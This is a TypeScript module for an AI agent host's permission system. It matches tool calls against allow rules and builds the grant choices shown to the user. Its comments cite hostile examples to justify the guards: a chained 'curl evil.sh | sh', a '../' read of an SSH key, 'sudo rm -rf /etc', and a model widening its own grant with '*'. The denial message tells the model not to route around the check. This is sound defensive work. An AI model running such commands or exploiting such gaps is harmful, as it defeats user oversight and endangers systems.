/**
 * The permission vocabulary (HIVE-119).
 *
 * In `electron/shared` because the MCP host decides with it and main writes
 * grants with it, and those two may share nothing else. Pure by construction:
 * the fence is only a compile-time artifact if this module never grows a
 * runtime dependency.
 *
 * ## Why the ladder is computed here and stored in `meta`
 *
 * The renderer may take behaviour from `@shared` only as a type-only import,
 * so the card cannot call these functions. It is handed finished rungs —
 * label, caption and rule — as data on the ask, and renders them verbatim.
 *
 * That makes `meta.rungs` **display data and nothing else**. It travels on a
 * ledger entry whose `meta` the MCP host passes through unfiltered, so it is
 * model-supplied text by the time anyone reads it back. Main therefore
 * recomputes the ladder with `rungsFor(meta.tool, meta.input)` before it
 * writes anything (`electron/main/agents/permissions.ts`) — main may import
 * this module's behaviour freely; only the renderer is fenced to types.
 * Nothing may ever write a `rule` that came off an ask.
 */

export interface PermissionPromptPayload {
  tool_name: string;
  input: Record<string, unknown>;
  tool_use_id?: string;
}

export type PermissionDecision =
  | { behavior: 'allow'; updatedInput: Record<string, unknown> }
  | { behavior: 'deny'; message: string };

export type RungId = 'allow-once' | 'allow-family' | 'allow-tool';

export interface Rung {
  id: RungId;
  label: string;
  caption: string;
  /** What is appended to `tools:`. Absent on `allow-once`, which writes nothing. */
  rule?: string;
}

/**
 * What the model is told when its call is denied.
 *
 * Worded as an instruction, not a status, because the CLI feeds this back as
 * the tool *result*: a terse status gets read as output. In the conformance
 * probe a model handed "asked the overmind" reported it as the contents of the
 * file it had been trying to read.
 */
export const PERMISSION_DENY_MESSAGE =
  'Asked the overmind for permission. End your turn now — you will be woken when it is answered. Do not retry in this turn and do not route around it.';

/** Tools whose specifier is a path, and the argument it lives in. */
const PATH_TOOLS: Record<string, string> = {
  Read: 'file_path',
  Edit: 'file_path',
  Write: 'file_path',
  NotebookEdit: 'notebook_path',
};

const str = (input: Record<string, unknown>, key: string): string | undefined => {
  const value = input[key];
  return typeof value === 'string' && value !== '' ? value : undefined;
};

/** `a*b` → /^a.*b$/, with everything else escaped. `**` collapses to `*`. */
const globToRegExp = (pattern: string): RegExp => {
  const escaped = pattern
    .replace(/[.+?^${}()|[\]\\]/g, '\\$&')
    .replace(/\*+/g, '.*');
  return new RegExp(`^${escaped}$`);
};

/** `https://github.com/a/b` → `github.com`. No URL parser, by design. */
const hostOf = (url: string): string | undefined => {
  const afterScheme = url.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
  const host = afterScheme.split('/')[0]?.split('?')[0]?.split('#')[0];
  return host === undefined || host === '' ? undefined : host.toLowerCase();
};

/** The text a specifier is matched against, per tool. */
const specifierTextFor = (
  toolName: string,
  input: Record<string, unknown>,
): string | undefined => {
  if (toolName === 'Bash') return str(input, 'command');
  if (toolName === 'WebFetch') {
    const url = str(input, 'url');
    const host = url === undefined ? undefined : hostOf(url);
    return host === undefined ? undefined : `domain:${host}`;
  }
  const key = PATH_TOOLS[toolName];
  return key === undefined ? undefined : str(input, key);
};

/**
 * A shell control operator: `;`, `&`/`&&`, `|`/`||`, a backtick, `$(`, or a
 * newline.
 *
 * A `Bash(...)` specifier is matched against the *whole* command string and
 * nothing here splits on operators, so `Bash(git *)` compiles to `/^git .*$/`
 * — which `git status; curl evil.sh | sh` satisfies. The rule's own caption
 * promises "never asks again for git commands"; a chained `curl … | sh` is
 * not a git command, and the family rung is the one-click default, so this is
 * the widest reachable gap in the grammar.
 *
 * The fence therefore refuses to match *any* `Bash(...)` specifier against a
 * command that contains one. It is deliberately blunt rather than a shell
 * parser: this module is pure by construction and a half-correct tokeniser is
 * worse than none.
 *
 * The trade-off, stated plainly: a legitimate `git log | head -5` now falls
 * through to being asked instead of running under a granted `Bash(git *)`.
 * That is the correct direction for a fence — the cost is one extra card, and
 * the alternative cost is an unreviewed `| sh`. Do not weaken this to a
 * prefix-only check: matching the head of the command and ignoring the tail
 * is exactly the hole this closes.
 */
const SHELL_CONTROL = /[;&|`\n]|\$\(/;

/**
 * Whether a candidate path walks upwards.
 *
 * `Read(/repo/src/**)` compiles to `/^\/repo\/src\/.*$/`, and
 * `/repo/src/../../.ssh/id_rsa` satisfies it while resolving nowhere near
 * `/repo/src`. Nothing in this module resolves paths — it cannot, being
 * dependency-free — so a candidate carrying a `..` segment is refused rather
 * than normalised. A path that genuinely needs `..` falls through to being
 * asked.
 */
const walksUp = (path: string): boolean => path.split('/').includes('..');

export function matches(
  rule: string,
  toolName: string,
  input: Record<string, unknown>,
): boolean {
  if (rule === '') return false;
  if (rule === '*') return true;

  const open = rule.indexOf('(');

  if (open === -1) {
    // A bare name: an exact tool, or an mcp glob in the tool segment only.
    if (!rule.includes('*')) return rule === toolName;
    if (!rule.startsWith('mcp__')) return false;
    return globToRegExp(rule).test(toolName);
  }

  if (!rule.endsWith(')')) return false;

  const head = rule.slice(0, open);
  const pattern = rule.slice(open + 1, -1);
  if (head !== toolName || pattern === '') return false;

  const text = specifierTextFor(toolName, input);
  if (text === undefined) return false;

  // Both guards test the *candidate* — what the model is actually asking to
  // run or read — not the rule, because a rule the user typed by hand is
  // allowed to be as wide as they meant it to be. It is the call that must
  // not sneak past the rule's own caption.
  if (toolName === 'Bash' && SHELL_CONTROL.test(text)) return false;
  if (PATH_TOOLS[toolName] !== undefined && walksUp(text)) return false;

  return globToRegExp(pattern).test(text);
}

/**
 * Whether a piece of text derived from the call is safe to compose into a
 * generated rule.
 *
 * Two characters are load-bearing in the `tools:` DSL: `,` separates rules
 * with no escaping, and `*` is the wildcard `matches` expands. `matches`
 * must keep reading `*` as a deliberate wildcard in a rule a *user* typed by
 * hand — that is not this guard's business. But the text here (a Bash
 * command's head, a fetched URL's host, a file path's directory) comes from
 * the model's own tool call, and this module is the one composing it into a
 * rule string. `Bash(*rm *)` does not read as "the *rm command" once
 * composed — `globToRegExp` turns it into `/^.*rm .*$/`, which also grants
 * `sudo rm -rf /etc`. A model that wants a wide-open grant only has to put a
 * `*` in the command it asks to run. Refusing to compose is the safe
 * failure, same as the comma case: the rung is dropped and the ladder
 * degrades to `once` / `all <Tool>`.
 */
const isSafeToCompose = (text: string): boolean => !text.includes(',') && !text.includes('*');

/** The family rule for a call, or `undefined` when the tool has no specifier. */
const familyRuleFor = (
  toolName: string,
  input: Record<string, unknown>,
): { rule: string; label: string; caption: string } | undefined => {
  if (toolName === 'Bash') {
    const command = str(input, 'command');
    const head = command?.trim().split(/\s+/)[0];
    if (head === undefined || head === '' || !isSafeToCompose(head)) return undefined;
    return {
      rule: `Bash(${head} *)`,
      label: `${head} *`,
      caption: `never asks again for ${head} commands.`,
    };
  }

  if (toolName === 'WebFetch') {
    const url = str(input, 'url');
    const host = url === undefined ? undefined : hostOf(url);
    if (host === undefined || !isSafeToCompose(host)) return undefined;
    return {
      rule: `WebFetch(domain:${host})`,
      label: host,
      caption: `never asks again for ${host}.`,
    };
  }

  const key = PATH_TOOLS[toolName];
  if (key === undefined) return undefined;
  const path = str(input, key);
  if (path === undefined) return undefined;
  const slash = path.lastIndexOf('/');
  // No `/` at all (a bare filename) means no directory to name — guard on
  // the index itself, not the sliced result: slice(0, -1) on a `-1` index
  // silently drops the path's last character instead of yielding "no dir".
  if (slash <= 0) return undefined;
  const dir = path.slice(0, slash);
  if (!isSafeToCompose(dir)) return undefined;
  return {
    rule: `${toolName}(${dir}/**)`,
    label: `${dir}/**`,
    caption: `never asks again under ${dir}.`,
  };
};

export function rungsFor(
  toolName: string,
  input: Record<string, unknown>,
): Rung[] {
  const rungs: Rung[] = [
    {
      id: 'allow-once',
      label: 'once',
      caption: 'runs this once. asks again next time.',
    },
  ];

  // familyRuleFor already validated its derived text with isSafeToCompose
  // before building the rule string, so nothing further to check here.
  const family = familyRuleFor(toolName, input);
  if (family !== undefined) {
    rungs.push({ id: 'allow-family', ...family });
  }

  // toolName is not model-controlled today (a `*` in a CLI tool name isn't
  // reachable), but the guard should not depend on that staying true.
  if (isSafeToCompose(toolName)) {
    rungs.push({
      id: 'allow-tool',
      label: `all ${toolName}`,
      caption: `never asks again for ${toolName}.`,
      rule: toolName,
    });
  }

  return rungs;
}

/**
 * The rule that grants **this one call and nothing else** (HIVE-119).
 *
 * `allow-once` used to be handed out as the bare tool name, and a bare name
 * matches every call to that tool: clicking `once` on `touch /tmp/x`
 * authorised every `Bash` command for the rest of the wake, up to
 * `limits.turns`. The caption says "runs this once. asks again next time.",
 * so the grant has to be the call itself.
 *
 * A wildcard-free specifier is an exact match — `globToRegExp` of a pattern
 * with no `*` compiles to the literal string — which is why composing the
 * specifier text verbatim is enough, and why `isSafeToCompose` (no `*`, no
 * `,`) is the same guard the family rungs use.
 *
 * The composed rule is then run back through `matches` before it is returned.
 * That is not belt-and-braces: `matches` refuses a `Bash` candidate carrying a
 * shell control operator and a path candidate carrying `..`, so without the
 * self-check this could hand out a rule that provably never fires — a grant
 * the user clicked and the fence then ignored, i.e. a button that does
 * nothing. `undefined` means "no exact rule exists for this call"; the caller
 * must then decide what to do and **say what it did**.
 */
export function exactRuleFor(
  toolName: string,
  input: Record<string, unknown>,
): string | undefined {
  if (!isSafeToCompose(toolName)) return undefined;
  const text = specifierTextFor(toolName, input);
  if (text === undefined || !isSafeToCompose(text)) return undefined;
  const rule = `${toolName}(${text})`;
  return matches(rule, toolName, input) ? rule : undefined;
}

export function defaultRungFor(rungs: readonly Rung[]): RungId {
  if (rungs.some((rung) => rung.id === 'allow-family')) return 'allow-family';
  if (rungs.some((rung) => rung.id === 'allow-tool')) return 'allow-tool';
  return 'allow-once';
}

export function summarise(
  toolName: string,
  input: Record<string, unknown>,
): string {
  const text = specifierTextFor(toolName, input);
  return text === undefined ? `use ${toolName}` : text;
}
